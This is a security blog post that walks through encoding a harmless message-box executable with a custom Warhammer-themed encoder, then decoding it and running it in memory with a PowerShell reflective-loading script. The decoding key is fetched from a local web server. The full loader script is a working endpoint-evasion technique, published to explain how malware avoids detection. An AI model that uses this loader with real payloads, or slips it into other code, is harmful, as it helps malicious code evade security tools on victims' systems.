---
title: Alternate Execution Methods - Encoding Payloads and Executing In-Memory via PowerShell
author: misthi0s
categories: ["execution"]
tags: [execution, .net, powershell, encoding, reflection]
date: 2024-12-01 12:42:00
featuredImage: "/images/8a1ef8a480285b6c263d4dac97a3e6d3941aaba5.jpg"
featuredImagePreview: "/images/8a1ef8a480285b6c263d4dac97a3e6d3941aaba5.jpg"
images:
    - "/images/8a1ef8a480285b6c263d4dac97a3e6d3941aaba5.jpg"
---

In this post, we'll go over a fun little project I've been working on; encoding an executable and using a PowerShell script to decode it and execute it in-memory. This is a common technique employed by malware to try to evade security tools on the infected system. By not writing a malicious executable to disk, there's less of a chance that any sort of endpoint security tool will detect and quarantine it before it can be executed. While this example will be rather simplistic in nature, it will hopefully outline how easy such a technique can be performed and provide some insight into one of many ways that threat actors will try to get their payload executed on their target.

## Creating the Main Payload

For this example, we'll be using a benign C# executable as our "malicious" payload. The main requirement of this payload is to prove that it executed properly, so it doesn't really matter what it does, as long as it produces something tangible for us to see. To achieve this, the program will simply launch a message box stating that the execution was successful. The C# code for this executable can be seen below:

```
using System.Windows.Forms;

namespace MsgBox
{
    internal class Program
    {
        static void Main()
        {
            MessageBox.Show("Successful execution!", "misthi0s", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }
}
```

Successful execution of this program produces the following:

![](/images/1e07f6a2dcb7889d15e621db429b4da6fa9c0125.png)

## Encoding the Payload

To help obfuscate the payload, we'll encode it by transposing each byte of the binary to something else. Obfuscation is another technique heavily employed by malware to hide its malicious nature, and encoding is one such way to achieve this. While we could use something like Base64 encoding, that's a bit too well-known and monitored for, so we'll employ our own encoding algorithm instead. For this, we'll use a tool that I created called Astartes. [Astartes](https://github.com/misthi0s/Astartes) is a Python-based encoding tool that will take each byte of an input dataset and convert it to the name of an Adeptus Astartes chapter (for those unfamiliar with Warhammer 40k, an Adeptus Astartes is a Space Marine).

To obfuscate our payload even further, Astartes uses a seed to randomize the master list of chapter names on execution, requiring a person to know the seed used to properly decode the information. We'll use the seed "Sororitas" (another 40k reference) to encode our payload; the full command-line for this Astartes execution can be seen below:

```
python astartes.py --file D:\repo\_CS\MessageBox\MessageBox\bin\Release\MessageBox.exe --seed Sororitas
```

This will create a file called `astartes_encoded.txt` that contains our encoded `MessageBox.exe` payload. A small snippet of this file can be seen below:

```
CRIMSONLEGION,CHARNELGUARD,RAPTORS,NIGHTSWORDS,BURNINGBLOOD,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,BLOODTIGERS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,SONSOFTHEPHOENIX,SONSOFTHEPHOENIX,NIGHTSWORDS,NIGHTSWORDS,WHITESCARS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,NIGHTSWORDS,DOOMEAGLES,NIGHTSWORDS,NIGHTSWORDS,...
```

As mentioned before, each value (comma-separated) represents a byte from the `MessageBox.exe` binary, concealing its true nature in a seemingly random collection of strings.

## Creating the PowerShell Script

Now that we have the encoded blob of our malicious payload, we need to create a PowerShell script to decode it and execute it in-memory. Below is the full PowerShell script that will do this (explanation of major components to follow):

```
# Initialize empty byte array
[byte[]] $DecodedBytes

# Get encoded blob
$Encoded = Get-Content -Path D:\repo\_Python\Astartes\astartes_encoded.txt

# Get decoding key
$Response = IWR -URI http://127.0.0.1:5000/?_=Sororitas
$Content = $Response.Content
$DecodingKey = $Content | ConvertFrom-Json

# Convert encoded blob to array
$Array = $Encoded.Split(",")

# Loop through array, decoding byte, saving to byte array
$Array | ForEach-Object {
	$Decoded = $DecodingKey.indexOf($_)
	$DecodedBytes += [byte[]]$Decoded
}

# Convert byte array to Base64 then convert back.
$Base64String = [System.Convert]::ToBase64String($DecodedBytes)
$FullBytes = [System.Convert]::FromBase64String($Base64String)

# Load the executable reflectively
$Assembly = [System.Reflection.Assembly]::Load($FullBytes)

# Get the "Main" function in the loaded exe
$EntryPoint = $Assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')

# Execute the exe
$EntryPoint.Invoke($null, $null)
```

## PowerShell Script Explained

The following section handles the decoding of the payload:

```
# Get encoded blob
$Encoded = Get-Content -Path D:\repo\_Python\Astartes\astartes_encoded.txt

# Get decoding key
$Response = IWR -URI http://127.0.0.1:5000/?_=Sororitas
$Content = $Response.Content
$DecodingKey = $Content | ConvertFrom-Json

# Convert encoded blob to array
$Array = $Encoded.Split(",")

# Loop through array, decoding byte, saving to byte array
$Array | ForEach-Object {
	$Decoded = $DecodingKey.indexOf($_)
	$DecodedBytes += [byte[]]$Decoded
}
```

For this example, we're first getting the encoded contents from the file `D:\repo\_Python\Astartes\astartes_encoded.txt` and storing it into variable `$Encoded`. The encoded string can (and most likely would, in a real world scenario) be saved directly in the PowerShell script, but I chose to do it this way for brevity's sake. 

Next, we need to get the decoding key to actually be able to decode the payload. This key will be the master list of chapter names, randomized according to the seed provided, to let us translate each chapter name to the byte value that was encoded. Astartes supports accessing this list via a web request (and includes an example [server script](https://github.com/misthi0s/Astartes/blob/main/examples/server_test/server.py) to achieve this), which is what is going on with the command `$Response = IWR -URI http://127.0.0.1:5000/?_=Sororitas`. Just like the encoded string, this list can be hardcoded into the script as a variable, but would also provide anyone analyzing the script the master decoder key, losing a bit of OpSec in the process.

After some formatting commands, we'll have two array variables: `$Array` containing the encoded blob and `$DecodingKey` containing the decoder list. The following `ForEach-Object` loop will go through each value in `$Array`, determine where that value exists in `$DecodingKey`, then get the index value of that item. This index value will be the exact byte value of that part of the encoded executable. In this example, this means that the string `NIGHTSWORDS` represents the byte value `0`, `GORGONS` represents `1`, `LEGIONOFTHEDAMNED` represents `2`, and so on. Once the entire `$Array` variable has been processed through this loop, we'll have the array variable `$DecodedBytes`, which will be the full byte representation of the `MessageBox.exe` binary.

The next portion of the script will handle the in-memory execution of our `MessageBox.exe` binary:

```
# Convert byte array to Base64 then convert back.
$Base64String = [System.Convert]::ToBase64String($DecodedBytes)
$FullBytes = [System.Convert]::FromBase64String($Base64String)

# Load the executable reflectively
$Assembly = [System.Reflection.Assembly]::Load($FullBytes)

# Get the "Main" function in the loaded exe
$EntryPoint = $Assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')

# Execute the exe
$EntryPoint.Invoke($null, $null)
```

For some reason, this script would only work if I first re-encoded the payload bytes to Base64 and then decoded them back into the original bytes. I'm really not sure why this was required, but it was the only way to get it to work (I suspect some weird PowerShell behavior, as loading the binary directly from the source worked without doing this, and I confirmed that the decoded bytes and the directly loaded bytes of the payload were 100% exactly the same).

Once this is done, the `MessageBox.exe` byte blob is loaded via Reflective Code Loading by the code `$Assembly = [System.Reflection.Assembly]::Load($FullBytes)`. Reflection is a technique used extensively by malware, and is something that I've even covered a sample doing in a [previous blog post](https://misthi0s.dev/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/). 

To actually execute the loaded assembly, the `Main` function needs to be found and accessed, so the program knows where the starting point of the payload is. This is achieved by the code `$EntryPoint = $Assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')`

Finally, now that the entry point of the payload has been found, it needs to be executed. This can be done with the `Invoke` command found in the line: `$EntryPoint.Invoke($null, $null)`. The second parameter of `Invoke` denotes the arguments that the loaded program requires, but since ours has no input arguments, `$null` is used.

## Putting It All Together

If everything works properly, upon script execution, our encoded payload should be decoded and then executed in-memory by the running PowerShell process. All that's left to do is to test it out.

First, we need to make sure the web server is running to obtain the master decoder list. This can be done by running the `server.py` script in the Astartes repo with the following command:

```
python server.py
```

Now, we simply execute the PowerShell script and, if everything works, we should see our message box.

![](/images/026c439a114ee381abbfb44ab2dfbd0425113267.png)

Success! We have successfully taken our executable payload, encoded it, then decoded it and executed it in-memory in the context of a PowerShell process. While this particular example isn't actually malicious in nature, it does outline how threat actors and malware can use multiple techniques to try and evade defensive measures to get their payloads to execute on a system.